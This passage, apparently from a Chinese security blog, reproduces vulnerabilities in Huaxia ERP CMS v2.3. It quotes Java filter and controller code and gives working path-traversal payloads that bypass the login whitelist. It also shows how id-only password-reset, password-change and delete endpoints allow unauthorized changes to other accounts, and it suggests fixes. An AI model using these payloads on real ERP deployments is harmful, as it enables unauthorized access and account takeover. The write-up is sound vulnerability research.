0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>这个代码使用循环将ignoredList数组中的进行正则匹配，经过处理ignoredList变为</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;.css&quot;</span>, <span class="string">&quot;.js&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.png&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.ico&quot;</span>]</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>于是正则匹配变为</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^.*.css.*$</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>这里面<code>.*</code>表示开头可以是任意字符匹配多次，后面也是一样，如果匹配到了则放行，虽然不知道代码为什么怎么写，但是这里的确可以进行目录穿越，还是因为没有过滤目录穿越符</p>
<p>payload2</p>
<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fuck.css/../home.html</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>也是只需要包含<code>.css</code>即可</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250831140531055.png" class title="image-20250831140531055">



<p>还有最后一层判断</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (String url : allowUrls) &#123;</span><br><span class="line">        <span class="keyword">if</span> (requestUrl.startsWith(url)) &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>这个定义了一些可以直接访问的路由，但还是目录穿越符梭哈</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebInitParam(name = &quot;filterPath&quot;,value = &quot;/user/login#/user/registerUser#/v2/api-docs&quot;)</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!StringUtils.isEmpty(filterPath)) &#123;</span><br><span class="line">            allowUrls = filterPath.contains(<span class="string">&quot;#&quot;</span>) ? filterPath.split(<span class="string">&quot;#&quot;</span>) : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;filterPath&#125;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>于是我们可以访问的路由都有了</p>
<p>payload3</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user/login/../../home.html</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>这个代码应该是为了在没登录的情况下也可以向这些路由发ajax请求</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250831141024333.png" class title="image-20250831141024333">



<h2 id="5-越权漏洞"><a href="#5-越权漏洞" class="headerlink" title="5.越权漏洞"></a>5.越权漏洞</h2><p>之前说的越权只是在未登录的情况下通过目录穿越符来到项目根目录再写路由访问不可访问的文件，还有一个越权漏洞，而这个越权漏洞可以进行垂直越权重置密码</p>
<p>我们有三种账号</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250831142050155.png" class title="image-20250831142050155">

<p>其中超管admin的密码不能被重置，只能在后台修改，我们的jsh账号更是看不到admin账号，然后就是无论哪个账号都不能删除用户，然后就是也只能重置密码为123456，不能对自己以外的密码进行修改。</p>
<p>我们在进行编辑信息的时候，前端代码将信息传递至<code>user/updateUser</code>路由，重置密码时则是<code>/restPwd</code>路由</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/resetPwd&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">resetPwd</span><span class="params">(<span class="meta">@RequestParam(&quot;id&quot;)</span> Long id,</span></span><br><span class="line"><span class="params">                                 HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Map&lt;String, Object&gt; objectMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">    <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">md5Pwd</span> <span class="operator">=</span> Tools.md5Encryp(password);</span><br><span class="line">    <span class="type">int</span> <span class="variable">update</span> <span class="operator">=</span> userService.resetPwd(md5Pwd, id);<span class="comment">//调用了service层的代码</span></span><br><span class="line">    <span class="keyword">if</span>(update &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> returnJson(objectMap, message, ErpInfo.OK.code);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> returnJson(objectMap, message, ErpInfo.ERROR.code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>将原始密码进行MD5加密后直接和id一起丢到service层代码中了</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Transactional(value = &quot;transactionManager&quot;, rollbackFor = Exception.class)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">resetPwd</span><span class="params">(String md5Pwd, Long id)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">int</span> result=<span class="number">0</span>;</span><br><span class="line">        logService.insertLog(<span class="string">&quot;用户&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(BusinessConstants.LOG_OPERATION_TYPE_EDIT).append(id).toString(),</span><br><span class="line">                ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest());</span><br><span class="line">        <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> getUser(id);<span class="comment">//通过id获取到对应的用户信息</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">loginName</span> <span class="operator">=</span> u.getLoginName();<span class="comment">//如果获取到的信息Username为admin则禁止重置 但是就简单的通过id判断用户信息，也没有session校验，也就是我可以发包重置admin以外的密码</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>.equals(loginName))&#123;</span><br><span class="line">            logger.info(<span class="string">&quot;禁止重置超管密码&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">            user.setId(id);</span><br><span class="line">            user.setPassword(md5Pwd);</span><br><span class="line"><span class="comment">//这个就是简单的将密码赋值给对象</span></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                result=userMapper.updateByPrimaryKeySelective(user);</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                JshException.writeFail(logger, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>我们来看下updateByPrimaryKeySelective方法执行的sql语句</p>
<div class="code-container" code-lang="Xml"><div class="codebox"><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;updateByPrimaryKeySelective&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.jsh.erp.datasource.entities.User&quot;</span>&gt;</span></span><br><span class="line">  update jsh_user</span><br><span class="line">  <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;username != null&quot;</span>&gt;</span></span><br><span class="line">      username = #&#123;username,jdbcType=VARCHAR&#125;,</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;loginName != null&quot;</span>&gt;</span></span><br><span class="line">      login_name = #&#123;loginName,jdbcType=VARCHAR&#125;,</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;password != null&quot;</span>&gt;</span></span><br><span class="line">      password = #&#123;password,jdbcType=VARCHAR&#125;,</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">  where id = #&#123;id,jdbcType=BIGINT&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>中间删掉了一堆没用的其他属性，我们要做的就是改密码。</p>
<p>本来是不能直接修改账号的，但是我们可以通过抓这个包通过修改json数据修改</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250901155101115.png" class title="image-20250901155101115">

<p>虽然好像还没有找到如何修改密码，但是好像有意外收获。</p>
<p>但是我又发现不知道为什么我可以访问到静态目录，难道没有添加的功能不需要过过滤器吗，这样通过html触发的确比在前端按键中触发要简单一点</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250901160444655.png" class title="image-20250901160444655">

<p>我们来看下修改密码的代码</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/updatePwd&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">updatePwd</span><span class="params">(<span class="meta">@RequestParam(&quot;userId&quot;)</span> Long userId, <span class="meta">@RequestParam(&quot;password&quot;)</span> String password,</span></span><br><span class="line"><span class="params">                        <span class="meta">@RequestParam(&quot;oldpwd&quot;)</span> String oldpwd, HttpServletRequest request)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    Map&lt;String, Object&gt; objectMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userService.getUser(userId);</span><br><span class="line">        <span class="type">String</span> <span class="variable">oldPassword</span> <span class="operator">=</span> Tools.md5Encryp(oldpwd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">md5Pwd</span> <span class="operator">=</span> Tools.md5Encryp(password);<span class="comment">//通过md5进行测试，但是这个太容易进行碰撞了</span></span><br><span class="line">        <span class="comment">//必须和原始密码一致才可以更新密码</span></span><br><span class="line">        <span class="keyword">if</span>(user.getLoginName().equals(<span class="string">&quot;jsh&quot;</span>))&#123;</span><br><span class="line">            flag = <span class="number">3</span>; <span class="comment">//管理员jsh不能修改密码</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (oldPassword.equalsIgnoreCase(user.getPassword())) &#123;</span><br><span class="line">            user.setPassword(md5Pwd);</span><br><span class="line">            flag = userService.updateUserByObj(user); <span class="comment">//1-成功</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            flag = <span class="number">2</span>; <span class="comment">//原始密码输入错误</span></span><br><span class="line">        &#125;</span><br><span class="line">        objectMap.put(<span class="string">&quot;status&quot;</span>, flag);</span><br><span class="line">        <span class="keyword">if</span>(flag &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> returnJson(objectMap, message, ErpInfo.OK.code);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> returnJson(objectMap, message, ErpInfo.ERROR.code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;修改用户ID为 ： &quot;</span> + userId + <span class="string">&quot;密码信息失败&quot;</span>, e);</span><br><span class="line">        flag = <span class="number">3</span>;</span><br><span class="line">        objectMap.put(<span class="string">&quot;status&quot;</span>, flag);</span><br><span class="line">        <span class="keyword">return</span> returnJson(objectMap, message, ErpInfo.ERROR.code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>于是请求也有了，直接修改密码</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250901160616808.png" class title="image-20250901160616808">

<p>这样就可以通过id修改登录账号以外的密码了</p>
<p>这个漏洞的主要触发原因我感觉在于仅仅通过id就能进行验证去修改密码，如果是用户自己修改或者管理员修改密码的话应该和登录的用户信息与id进行校验，应该使用某些密匙加密如jwt等手段进行加密，不然通过伪造请求头能够实现一些比如修改密码和用户名，任意重置密码等未启用的功能，配合之前的白名单越权漏洞可以直接不用登录就实现密码修改</p>
<p>还有就是一个未实装的功能删除用户也可以使用这个方法实现删除用户，我们先来看代码</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/deleteUser&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">deleteUser</span><span class="params">(<span class="meta">@RequestParam(&quot;ids&quot;)</span> String ids)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">result</span> <span class="operator">=</span> ExceptionConstants.standardSuccess();</span><br><span class="line">    userService.batDeleteUser(ids);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>service层代码</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional(value = &quot;transactionManager&quot;, rollbackFor = Exception.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">batDeleteUser</span><span class="params">(String ids)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> 